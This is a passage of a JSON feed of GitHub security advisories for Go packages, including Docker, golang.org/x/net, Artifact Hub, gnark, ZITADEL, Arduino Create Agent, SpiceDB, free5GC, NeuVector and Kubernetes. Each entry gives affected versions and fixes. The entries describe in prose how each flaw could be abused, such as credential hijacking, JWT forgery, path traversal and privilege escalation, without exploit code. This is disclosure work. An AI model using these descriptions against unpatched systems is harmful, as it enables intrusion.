"2023-10-17T12:40:37Z", "nvd_published_at": "2023-10-16T21:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jq35-85cj-fj4p", "modified": "2023-10-30T15:25:44Z", "published": "2023-10-30T15:25:44Z", "aliases": [], "summary": "/sys/devices/virtual/powercap accessible by default to containers", "details": "Intel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments running directly on affected hardware. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "24.0.0"}, {"fixed": "24.0.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "21.0.0"}, {"fixed": "23.0.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "20.10.27"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-jq35-85cj-fj4p"}, {"type": "WEB", "url": "https://github.com/moby/moby/commit/48ebe353e49a9def5e6679f6e386b0efb1c95f0e"}, {"type": "WEB", "url": "https://github.com/moby/moby/commit/81ebe71275768629689a23bc3bca34b3b374a6a6"}, {"type": "WEB", "url": "https://github.com/moby/moby/commit/c9ccbfad11a60e703e91b6cca4f48927828c7e35"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}, {"type": "WEB", "url": "https://github.com/moby/moby/releases/tag/v20.10.27"}, {"type": "WEB", "url": "https://github.com/moby/moby/releases/tag/v23.0.8"}, {"type": "WEB", "url": "https://github.com/moby/moby/releases/tag/v24.0.7"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-30T15:25:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4374-p667-p6c8", "modified": "2023-12-07T23:00:43Z", "published": "2023-10-11T20:35:43Z", "aliases": ["CVE-2023-39325"], "summary": "HTTP/2 rapid reset can cause excessive work in net/http", "details": "A malicious HTTP/2 client which rapidly creates requests and immediately resets them can cause excessive server resource consumption. While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing. \n\nWith the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams). New requests arriving when at the limit (which can only happen after the client has reset an existing, in-flight request) will be queued until a handler exits. If the request queue grows too large, the server will terminate the connection. \n\nThis issue is also fixed in golang.org/x/net/http2 for users manually configuring HTTP/2.\n\nThe default stream concurrency limit is 250 streams (requests) per HTTP/2 connection. This value may be adjusted using the golang.org/x/net/http2 package; see the Server.MaxConcurrentStreams setting and the ConfigureServer function.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39325"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/63417"}, {"type": "WEB", "url": "https://go.dev/cl/534215"}, {"type": "WEB", "url": "https://go.dev/cl/534235"}, {"type": "WEB", "url": "https://go.dev/issue/63417"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/iNNxDTCjZvo/m/UDd7VKQuAAAJ"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3SZN67IL7HMGMNAVLOTIXLIHUDXZK4LH/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BUK2ZIAGCULOOYDNH25JPU6JBES5NF2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AVZDNSMVDAQJ64LJC5I5U5LDM5753647/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CLB4TW7KALB3EEQWNWCN7OUIWWVWWCG2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/D2BBIDR2ZMB3X5BC7SR4SLQMHRMVPY6L/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ECRC75BQJP6FJN2L7KCKYZW4DSBD7QSD/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GSY7SXFFTPZFWDM6XELSDSHZLVW3AHK7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HZQIELEIRSZUYTFFH5KTH2YJ4IIQG2KE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KSEGD2IWKNUO3DWY4KQGUQM5BISRWHQE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NG7IMPL55MVWU3LCI4JQJT3K2U5CHDV7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OXGWPQOJ3JNDW2XIYKIVJ7N7QUIFNM2Q/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QF5QSYAOPDOWLY6DUHID56Q4HQFYB45I/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R3UETKPUB3V5JS5TLZOF3SMTGT5K5APS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/REMHVVIBDNKSRKNOTV7EQSB7CYQWOUOU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T7N5GV4CHH6WAGX3GFMDD3COEOVCZ4RI/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ULQQONMSCQSH5Z5OWFFQHCGEZ3NL4DRJ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTT7DG3QOF5ZNJLUGHDNLRUIN6OWZARP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WCNCBYKZXLDFGAJUB7ZP5VLC3YTHJNVH/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XFOIBB4YFICHDM7IBOP7PWXW3FX4HLL2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XTNLSL44Y5FB6JWADSZH6DCV4JJAAEQY/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YRKEXKANQ7BKJW2YTAMP625LJUJZLJ4P/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-2102"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202311-09"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20231110-0008/"}, {"type": "PACKAGE", "url": "golang.org/x/net"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-11T20:35:43Z", "nvd_published_at": "2023-10-11T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g6pq-x539-7w4j", "modified": "2023-10-19T19:35:35Z", "published": "2023-10-19T17:04:50Z", "aliases": ["CVE-2023-45821"], "summary": "Artifact Hub has Incorrect Docker Hub registry check", "details": "### Impact\n\nDuring a security audit of Artifact Hub's code base, a security researcher at [OffSec](https://www.offsec.com/) identified a bug in which the `registryIsDockerHub` function was only checking that the registry domain had the `docker.io` suffix.\n\nArtifact Hub allows providing some Docker credentials that are used to increase the rate limit applied when interacting with the Docker Hub registry API to read publicly available content. Due to the incorrect check described above, it'd be possible to hijack those credentials by purchasing a domain which ends with `docker.io` and deploying a fake OCI registry on it.\n\n<https://artifacthub.io/> uses some credentials that only have permissions to read public content available in the Docker Hub. However, even though credentials for private repositories (disabled on `artifacthub.io`) are handled in a different way, other Artifact Hub deployments could have been using them for a different purpose.\n\n### Patches\n\nThis issue has been resolved in version [1.16.0](https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/artifacthub/hub"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/artifacthub/hub/security/advisories/GHSA-g6pq-x539-7w4j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45821"}, {"type": "WEB", "url": "https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0"}, {"type": "PACKAGE", "url": "https://github.com/artifacthub/hub"}], "database_specific": {"cwe_ids": ["CWE-494"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-19T17:04:50Z", "nvd_published_at": "2023-10-19T21:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-498w-5j49-vqjg", "modified": "2023-10-13T23:13:57Z", "published": "2023-10-04T14:44:08Z", "aliases": ["CVE-2023-44378"], "summary": "gnark unsoundness in variable comparison / non-unique binary decomposition", "details": "### Impact\n\nFor some in-circuit values, it is possible to construct two valid decomposition to bits. In addition to the canonical decomposition of `a`, for small values there exists a second decomposition for `a+r` (where `r` is the modulus the values are being reduced by). The second decomposition was possible due to overflowing the field where the values are defined.\n\nInternally, the comparison methods `frontend.API.Cmp` and `frontend.API.IsLess` used binary decomposition and checked the bitwise differences. This allows a malicious prover to construct a valid proof for a statement `a < b` even if `a > b`.\n\nThe issue impacts all users using `API.Cmp` or `API.IsLess` methods. Additionally, it impacts the users using `bits.ToBinary` or `API.ToBinary` methods if full-width decomposition is requested (the default behaviour if no options are given).\n\nThe issues does not impact comparison methods in field emulation (package `std/math/emulated`) and dedicated comparison package (`std/math/cmp`).\n\n### Patches\n\nFix has been implemented in pull request #835 and merged in commit 59a4087261a6c73f13e80d695c17b398c3d0934f to master branch. The release v0.9.0 and onwards include the fix.\n\nThe fix added additional comparison of the decomposed bit-vector to the modulus of the in-circuit values.  \n\n### Workarounds\n\nUpgrading to version v0.9.0 should fix the issue without needing to change the calls to value comparison methods.\n\nAlternatively, users can use the `std/math/cmp` gadget, which additionally allows to bound the number of bits being compared, making the comparisons more efficient if the bound on the absolute difference of the values is known.\n\n### References\n\n* https://github.com/Consensys/gnark/pull/835\n* https://github.com/zkopru-network/zkopru/issues/116\n* https://github.com/iden3/circomlib/pull/48\n\n### Acknowledgement\n\nThe vulnerability was reported by [Marcin Kostrzewa](https://github.com/kustosz) @ [Reilabs](https://reilabs.io/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/consensys/gnark"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-498w-5j49-vqjg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44378"}, {"type": "WEB", "url": "https://github.com/zkopru-network/zkopru/issues/116"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark/pull/835"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark/commit/59a4087261a6c73f13e80d695c17b398c3d0934f"}, {"type": "PACKAGE", "url": "https://github.com/Consensys/gnark"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-498w-5j49-vqjg"}], "database_specific": {"cwe_ids": ["CWE-191", "CWE-697"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-04T14:44:08Z", "nvd_published_at": "2023-10-09T14:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v683-rcxx-vpff", "modified": "2023-10-10T21:30:15Z", "published": "2023-10-10T21:30:15Z", "aliases": ["CVE-2023-44399"], "summary": "ZITADEL's password reset does not respect the \"Ignoring unknown usernames\" setting", "details": "### Impact\nZITADEL administrators can enable a setting called \"Ignoring unknown usernames\" which helps mitigate attacks that try to guess/enumerate usernames. While this settings was properly working during the authentication process it did not work correctly on the password reset flow. This meant that even if this feature was active that an attacker could use the password reset function to verify if an account exist within ZITADEL.\n\n### Patches\nThis bug has been patched in versions >2.27.2 beginning with [2.37.3](https://github.com/zitadel/zitadel/releases/tag/v2.37.3) and [2.38.0](https://github.com/zitadel/zitadel/releases/tag/v2.38.0)\n\n### Workarounds\nNone available we advise to updated if this is needed.\n\n### References\nNone\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.37.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zitadel/zitadel/security/advisories/GHSA-v683-rcxx-vpff"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44399"}, {"type": "PACKAGE", "url": "https://github.com/zitadel/zitadel"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.37.3"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.38.0"}], "database_specific": {"cwe_ids": ["CWE-640"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-10T21:30:15Z", "nvd_published_at": "2023-10-10T17:15:13Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4x5q-q7wc-q22p", "modified": "2023-11-02T17:33:32Z", "published": "2023-10-18T15:54:26Z", "aliases": ["CVE-2023-43800"], "summary": "Arduino Create Agent Insufficient Verification of Data Authenticity vulnerability", "details": "### Impact\nThe vulnerability affects the endpoint `/v2/pkgs/tools/installed`. A user who has the ability to perform HTTP requests to the localhost interface, or is able to bypass the CORS configuration, can escalate his privileges to those of the user running the Arduino Create Agent service via a crafted HTTP POST request.\nFurther details are available in the references.\n\n### Fixed Version\n* `1.3.3`\n\n### References\nThe issue was reported by Nozomi Networks Labs. Further details are available at the following URL:\n* https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/arduino/arduino-create-agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/security/advisories/GHSA-4x5q-q7wc-q22p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43800"}, {"type": "PACKAGE", "url": "https://github.com/arduino/arduino-create-agent"}, {"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/releases/tag/1.3.3"}, {"type": "WEB", "url": "https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-18T15:54:26Z", "nvd_published_at": "2023-10-18T22:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jg7w-cxjv-98c2", "modified": "2023-11-03T15:41:54Z", "published": "2023-10-31T22:23:44Z", "aliases": ["CVE-2023-46255"], "summary": "SpiceDB leaks information in log files when URI cannot be parsed", "details": "SpiceDB is an open source, Google Zanzibar-inspired database for creating and managing security-critical application permissions. When the provided datastore URI is malformed (e.g. by having a password which contains `:`) the full URI (including the provided password) is printed, so that the password is shown in the logs. Version 1.27.0-rc1 patches this issue.\n\nExample output:\n```\nterminated with errors error=\"unable to create migration driver for postgres: parse \\\"postgres://spicedb:<PASSWORD IN PLAINTEXT>\": invalid port \\\"<PASSWORD IN PLAINTEXT>\\\" after host\"\n```", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/authzed/spicedb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.27.0-rc1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/authzed/spicedb/security/advisories/GHSA-jg7w-cxjv-98c2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46255"}, {"type": "WEB", "url": "https://github.com/authzed/spicedb/commit/ae50421b80f895e4c98d999b18e06b6f1e6f1cf8"}, {"type": "PACKAGE", "url": "https://github.com/authzed/spicedb"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-31T22:23:44Z", "nvd_published_at": "2023-10-31T16:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9pc8-m4vp-ggvf", "modified": "2023-10-19T19:35:40Z", "published": "2023-10-19T17:05:16Z", "aliases": ["CVE-2023-45822"], "summary": "Artifact Hub allows unsafe rego built-in", "details": "### Impact\n\nDuring a security audit of Artifact Hub's code base, a security researcher at [OffSec](https://www.offsec.com/) identified a bug in which a default unsafe rego built-in was allowed to be used when defining authorization policies.\n\nArtifact Hub includes a fine-grained authorization mechanism that allows organizations to define what actions can be performed by their members. It is based on customizable authorization policies that are enforced by the [Open Policy Agent](https://www.openpolicyagent.org/). Policies are written using [rego](https://www.openpolicyagent.org/docs/latest/#rego) and their data files are expected to be json documents. By default, `rego` allows policies to make HTTP requests, which can be abused to send requests to internal resources and forward the responses to an external entity. In the context of Artifact Hub, this capability should have been disabled.\n\n### Patches\n\nThis issue has been resolved in version [1.16.0](https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/artifacthub/hub"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/artifacthub/hub/security/advisories/GHSA-9pc8-m4vp-ggvf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45822"}, {"type": "WEB", "url": "https://artifacthub.io/packages/helm/artifact-hub/artifact-hub?modal=changelog&version=1.16.0"}, {"type": "PACKAGE", "url": "https://github.com/artifacthub/hub"}, {"type": "WEB", "url": "https://www.openpolicyagent.org/"}, {"type": "WEB", "url": "https://www.openpolicyagent.org/docs/latest/#rego"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-10-19T17:05:16Z", "nvd_published_at": "2023-10-19T21:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cqvv-r3g3-26rf", "modified": "2023-10-31T22:07:50Z", "published": "2023-10-23T03:30:30Z", "aliases": ["CVE-2023-46324"], "summary": "free5GC udm vulnerable to Invalid Curve Attack", "details": "pkg/suci/suci.go in free5GC udm before 1.2.0, when Go before 1.19 is used, allows an Invalid Curve Attack because it may compute a shared secret via an uncompressed public key that has not been validated. An attacker can send arbitrary SUCIs to the UDM, which tries to decrypt them via both its private key and the attacker's public key.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/udm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46324"}, {"type": "WEB", "url": "https://github.com/free5gc/udm/pull/20"}, {"type": "WEB", "url": "https://github.com/free5gc/udm/commit/5e1479cc686f058992557669b13fd3761a1b6024"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/udm"}, {"type": "WEB", "url": "https://github.com/free5gc/udm/compare/v1.1.1...v1.2.0"}], "database_specific": {"cwe_ids": ["CWE-327", "CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-10-24T02:00:10Z", "nvd_published_at": "2023-10-23T01:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m5jc-r4gf-c6p8", "modified": "2023-11-02T17:34:40Z", "published": "2023-10-18T18:25:34Z", "aliases": ["CVE-2023-43803"], "summary": "Arduino Create Agent path traversal - arbitrary file deletion vulnerability", "details": "### Impact\nThe vulnerability affects the endpoint `/v2/pkgs/tools/installed` and the way it handles plugin names supplied as user input.\nA user who has the ability to perform HTTP requests to the localhost interface, or is able to bypass the CORS configuration, can delete arbitrary files or folders belonging to the user that runs the Arduino Create Agent via a crafted HTTP POST request.\nFurther details are available in the references.\n\n### Fixed Version\n* `1.3.3`\n\n### References\nThe issue was reported by Nozomi Networks Labs. Further details on the issue are available at the following URL:\n* https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/arduino/arduino-create-agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/security/advisories/GHSA-m5jc-r4gf-c6p8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43803"}, {"type": "PACKAGE", "url": "https://github.com/arduino/arduino-create-agent"}, {"type": "WEB", "url": "https://github.com/arduino/arduino-create-agent/releases/tag/1.3.3"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/11/msg00005.html"}, {"type": "WEB", "url": "https://www.nozominetworks.com/blog/security-flaws-affect-a-component-of-the-arduino-create-cloud-ide"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-35"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-18T18:25:34Z", "nvd_published_at": "2023-10-18T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-622h-h2p8-743x", "modified": "2023-10-06T20:43:52Z", "published": "2023-10-06T20:43:52Z", "aliases": ["CVE-2023-32188"], "summary": "JWT token compromise can allow malicious actions including Remote Code Execution (RCE) ", "details": "### Impact \n\nA user can reverse engineer the JWT token (JSON Web Token) used in authentication for Manager and API access, forging a valid NeuVector Token to perform malicious activity in NeuVector. This can lead to an RCE. \n\n### Patches \n\nUpgrade to NeuVector [version 5.2.2](https://open-docs.neuvector.com/releasenotes/5x) or later and latest Helm chart (2.6.3+). \n+ In 5.2.2 the certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.\n+ Use Helm-based deployment/upgrade to 5.2.2 to generate a unique certificate for Manager, REST API, ahd registry adapter. Helm based installation/upgrade is required in order to automatically generate certificates upon initial installation and each subsequent upgrade. \n+ See [release notes](https://open-docs.neuvector.com/releasenotes/5x) for manual/yaml based deployment advice.\n+ 5.2.2 also implements additional protections against possible RCE for the feature of custom compliance scripts. \n\n### Workarounds \n\nUsers can replace the Manager & Controller certificate manually by following the instructions in documented [here](https://open-docs.neuvector.com/configuration/console/replacecert). However, upgrading to 5.2.2 and replacing Manager/REST API certificate is recommended to provide additional security enhancements to prevent possible attempted exploit and resulting RCE. See [release notes](https://open-docs.neuvector.com/releasenotes/5x) for additional details.\n\n### For More Information \n\nView the NeuVector [Security Policy](https://github.com/neuvector/neuvector/security) \n\nGeneral NeuVector [documentation](https://open-docs.neuvector.com/) ", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/neuvector/neuvector"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.2.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/neuvector/neuvector/security/advisories/GHSA-622h-h2p8-743x"}, {"type": "PACKAGE", "url": "https://github.com/neuvector/neuvector"}, {"type": "WEB", "url": "https://open-docs.neuvector.com/releasenotes/5x"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-10-06T20:43:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q78c-gwqw-jcmc", "modified": "2023-11-01T17:16:38Z", "published": "2023-10-31T21:32:35Z", "aliases": ["CVE-2023-3955"], "summary": "Kubernetes privilege escalation vulnerability", "details": "A security issue was discovered in Kubernetes where a user that can create pods on Windows nodes may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they include Windows nodes.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.28.0"}, {"fixed": "1.28.1"}]}], "versions": ["1.28.0"]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.27.0"}, {"fixed": "1.27.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.26.0"}, {"fixed": "1.26.8"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.25.0"}, {"fixed": "1.25.13"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.17"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3955"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/119595"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120128"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120134"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120135"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120136"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120137"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/120138"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/38c97fa67ed35f36e730856728c9e3807f63546a"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/50334505cd27cbe7cf71865388f25a00e29b2596"}, {"type": "WEB", 